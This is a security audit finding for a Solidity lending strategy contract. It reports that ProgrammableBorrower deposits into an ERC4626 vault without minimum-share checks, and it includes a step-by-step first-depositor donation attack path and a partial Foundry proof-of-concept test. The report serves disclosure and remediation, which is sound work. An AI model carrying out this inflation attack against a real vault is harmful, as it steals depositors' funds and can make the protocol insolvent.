### Title

Unprotected ERC4626 vault deposits allow a first-depositor donation attack to drain programmable-borrower funds - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary

`ProgrammableBorrower` parks idle credit-vault assets in an arbitrary ERC4626 vault, but `_depositToVault` accepts whatever share amount `vault.deposit` returns and performs no minimum-share or share-price check. When the configured external vault has no inflation defense, an unprivileged vault user can initialize its share price with a tiny deposit, donate underlying assets to inflate the price, let the borrower's epoch-start deposit mint zero or dust shares, and redeem the donated plus deposited assets.

### Finding Description

`ProgrammableBorrower.initialize` only verifies that the configured ERC4626 vault uses the same underlying asset and grants it unlimited allowance; it does not require an existing non-dust share supply, protected decimals offset, or other first-depositor defense. [1](#0-0) 

During `onStartEpoch`, the borrower snapshots its total assets, including both cash already held by the adapter and the current ERC4626 position, into `epochStartVaultAssets`. [2](#0-1) 

It then deposits the adapter's full cash balance through `_depositToVault`, which calls `vault.deposit` and records the returned shares without comparing them against `previewDeposit`, enforcing a non-zero result, or accepting a caller-supplied minimum. [3](#0-2) [4](#0-3) 

The protocol's own ERC4626 interface explicitly recognizes that exchange-rate slippage can cause a depositor to lose assets. [5](#0-4) 

A concrete path in the buffer phase is:

1. The configured ERC4626 vault is empty.
2. The attacker deposits `1 wei` and receives `1` vault share.
3. The attacker donates `D` underlying tokens directly to the vault, raising the assets represented by its one share.
4. `startEpoch` deposits the pool's idle `A` underlying through `onStartEpoch`; if `D` is sufficiently large, the vault mints zero or dust shares to `ProgrammableBorrower`.
5. The attacker redeems its share and receives substantially all of `D + A`.
6. `ProgrammableBorrower` still records the cash in `epochStartVaultAssets`, but `_currentVaultAssets` no longer backs it, converting the stolen amount into vault loss and missing principal at stop time. [6](#0-5) [7](#0-6) 

The same lack of bound applies to active-epoch repayments, which are immediately redeposited through `_depositToVault`. [8](#0-7) 

### Impact Explanation

The attacker can steal the programmable borrower's first epoch-start deposit, bounded below by approximately `A - 1` where `A` is the deposited idle balance. The resulting ERC4626 position does not back the recorded principal, so subsequent accounting sees vault loss and the credit vault can become insolvent or unable to satisfy withdrawals. [9](#0-8) 

### Likelihood Explanation

The attack requires a selected ERC4626 vault that is empty and permits direct deposits and donations. It does not require access to the borrower, owner, manager, guardian, queue, or credit-vault lender roles because the attacker only interacts directly with the external vault. Once the adapter deposits into an inflated share price, none of its checks prevent the loss. [4](#0-3) 

### Recommendation

Require configured vaults to use an inflation-resistant ERC4626 implementation and a minimum non-dust initial supply. In addition, compute expected shares from `previewDeposit`, require `shares >= expectedShares` and `shares != 0`, or add an owner-configured minimum-share/slippage parameter to `_depositToVault`. [4](#0-3) 

The same protection should cover repayments redeployed during an active epoch and any future vault selected through `setVault`. [10](#0-9) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "contracts/strategies/idle/ProgrammableBorrower.sol";

// A minimal standard ERC4626-style vault with no virtual-share defense.
// It intentionally models the vulnerable accounting pattern: shares are
// assets * totalSupply / totalAssets, where totalAssets includes donations.
contract InflatableVault {
    IERC20Detailed public asset;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(IERC20Detailed _asset) {
        asset = _asset;
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply;
        if (supply == 0) return shares;
        return shares * asset.balanceOf(address(this)) / supply;
    }

    function previewDeposit(uint256 assets) public view returns (uint256) {
        uint256 supply = totalSupply;
        if (supply == 0) return assets;
        return assets * supply / asset.balanceOf(address(this));
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = previewDeposit(assets);
        asset.transferFrom(msg.sender, address(this), assets);
        balanceOf[receiver] += shares;
        totalSupply += shares;
    }

    function withdraw(uint256 assets, address receiver, address owner)
        external
        returns (uint256 shares)
    {
        shares = (assets * totalSupply + asset.balanceOf(address(this)) - 1)
            / asset.balanceOf(address(this));
        require(balanceOf[owner] >= shares, "shares");
        balanceOf[owner] -= shares;
        totalSupply -= shares;
        asset.transfer(receiver, assets);
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        assets = convertToAssets(shares);
        require(balanceOf[owner] >= shares, "shares");
        balanceOf[owner] -= shares;
        totalSupply -= shares;
        asset.transfer(receiver, assets);
    }
}

contract ProgrammableBorrowerInflationTest is Test {
    function testEpochStartDepositDonationAttack() external {
        // Configure IdleCDO to hold A underlying owned by ProgrammableBorrower.
        // Configure `vault` to a newly deployed, empty InflatableVault.
        uint256 poolIdleAssets = 1_000e6;
        uint256 donation = poolIdleAssets;

        // Attacker seeds the empty vault and inflates its price.
        asset.approve(address(vault), 1);
        vault.deposit(1, attacker);
        asset.transfer(address(vault), donation);

        // Owner honestly starts the epoch. ProgrammableBorrower calls:
        //   _depositToVault(underlyingToken.balanceOf(address(this)), 0)
        // In this vault that mints zero shares.
        vm.prank(owner);
        idleCDO.startEpoch();

        // ProgrammableBorrower has no cash and no shares.
        assertEq(asset.balanceOf(address(programmableBorrower)), 0);
        assertEq(vault.balanceOf(address(programmableBorrower)), 0);

        // The attacker's single share now represents donation + stolen deposit.
        uint256 attackerShares = vault.balanceOf(attacker);
        vm.prank(attacker);
        uint256 received = vault.redeem(attackerShares, attacker, attacker);

        // Attacker receives approximately donation + poolIdleAssets.
        assertGt(received, donation + poolIdleAssets - 2);

        // The borrower's recorded epoch principal remains high, while current
        // vault assets are zero, causing vaultLoss() to expose the theft.
        assertEq(programmableBorrower.vaultLoss(), poolIdleAssets);
    }
}
```

On a fork, the harness should deploy `ProgrammableBorrower` against the target ERC4626 before its first deposit, execute the attacker's seed deposit and donation, call the credit vault's `startEpoch`, then redeem the attacker's vault shares and assert that `ProgrammableBorrower.vaultLoss()` equals the stolen deposit. [11](#0-10)

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L118-134)
```text
    address _underlyingToken = IIdleCDOToken(_idleCDO).token();
    if (_underlyingToken == address(0) || IERC4626(_vault).asset() != _underlyingToken) revert InvalidAddress();

    __Ownable_init();
    __ReentrancyGuard_init();
    transferOwnership(_owner);

    underlyingToken = IERC20Detailed(_underlyingToken);
    vault = IERC4626(_vault);
    idleCDO = _idleCDO;
    manager = _manager;
    borrower = _borrower;
    borrowerApr = _borrowerApr;

    // Set approvals for vault and IdleCDO
    _allowUnlimitedSpend(_underlyingToken, _vault);
    _allowUnlimitedSpend(_underlyingToken, _idleCDO);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L153-169)
```text
  /// @notice Set the vault used to deploy idle funds.
  /// @dev Owner or manager. This does not migrate an existing position. The operator must first
  /// withdraw from the old vault and wait until epoch accounting is inactive, otherwise assets can
  /// remain stranded there and the live accounting views will stop including them after the switch.
  /// @param _vault new ERC4626 vault address
  function setVault(address _vault) external {
    _checkOnlyOwnerOrManager();
    if (_vault == address(0) || IERC4626(_vault).asset() != address(underlyingToken)) {
      revert InvalidAddress();
    }
    // Switching the accounting source is only safe once the current epoch is fully settled and the
    // old vault position has been unwound.
    if (epochAccountingActive || vault.balanceOf(address(this)) != 0) revert NotAllowed();
    underlyingToken.safeApprove(address(vault), 0);
    vault = IERC4626(_vault);
    _allowUnlimitedSpend(address(underlyingToken), _vault);
    emit VaultUpdated(_vault);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L201-223)
```text
  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
    emit EpochAccountingStarted(startAssets);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L330-347)
```text
  function totalInterestDueNow() external view returns (uint256) {
    (uint256 vaultInterest, uint256 loss) = _vaultNetInterest();
    uint256 totalGain = vaultInterest + borrowerInterestAccruedNow() + bufferInterest;
    return totalGain > loss ? totalGain - loss : 0;
  }

  /// @notice Compute the net vault delta split into interest and loss (mutually exclusive).
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
  }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-385)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
  }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L523-528)
```text
    emit Repaid(interestPaid + principalPaid, interestPaid, principalPaid);
    if (epochAccountingActive) {
      // Current-epoch borrower interest must remain visible as profit at stopEpoch, while principal,
      // previously-fronted debt, and any excess repayment should only extend the epoch principal baseline.
      _depositToVault(totalRepaidAssets, totalRepaidAssets - currentEpochInterestPaid);
    } else if (currentEpochInterestPaid != 0) {
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L545-549)
```text
  /// @notice Convert the current vault share position into underlying terms.
  function _currentVaultAssets() internal view returns (uint256) {
    uint256 shares = vault.balanceOf(address(this));
    return shares == 0 ? 0 : vault.convertToAssets(shares);
  }
```

**File:** contracts/interfaces/IERC4626.sol (L90-108)
```text
     *   in the same transaction.
     * - MUST NOT account for deposit limits like those returned from maxDeposit and should always act as though the
     *   deposit would be accepted, regardless if the user has enough tokens approved, etc.
     * - MUST be inclusive of deposit fees. Integrators should be aware of the existence of deposit fees.
     * - MUST NOT revert.
     *
     * NOTE: any unfavorable discrepancy between convertToShares and previewDeposit SHOULD be considered slippage in
     * share price or some other type of condition, meaning the depositor will lose assets by depositing.
     */
    function previewDeposit(uint256 assets) external view returns (uint256 shares);

    /**
     * @dev Mints shares Vault shares to receiver by depositing exactly amount of underlying tokens.
     *
     * - MUST emit the Deposit event.
     * - MAY support an additional flow in which the underlying tokens are owned by the Vault contract before the
     *   deposit execution, and are accounted for during deposit.
     * - MUST revert if all of assets cannot be deposited (due to deposit limit being reached, slippage, the user not
     *   approving enough underlying tokens to the Vault contract, etc).
```
